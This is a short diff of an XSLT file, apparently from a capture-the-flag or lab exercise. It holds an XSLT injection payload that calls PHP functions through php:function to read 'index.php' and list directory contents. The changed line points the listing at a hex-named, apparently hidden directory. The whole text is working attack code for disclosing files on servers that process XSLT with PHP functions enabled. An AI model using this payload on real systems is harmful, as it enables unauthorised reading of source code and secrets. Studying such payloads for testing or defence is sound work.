@@ -3,7 +3,7 @@
 
  <xsl:value-of select="php:function('readfile','index.php')" />
     
- <xsl:value-of select="php:function('opendir','.')"/>
+ <xsl:value-of select="php:function('opendir','.6ff3200bee785801f420fba826ffcdee')"/>
 <xsl:value-of select="php:function('readdir')"/>
  
  <br />Vendor:  <xsl:value-of select="php:function('readdir')"/>
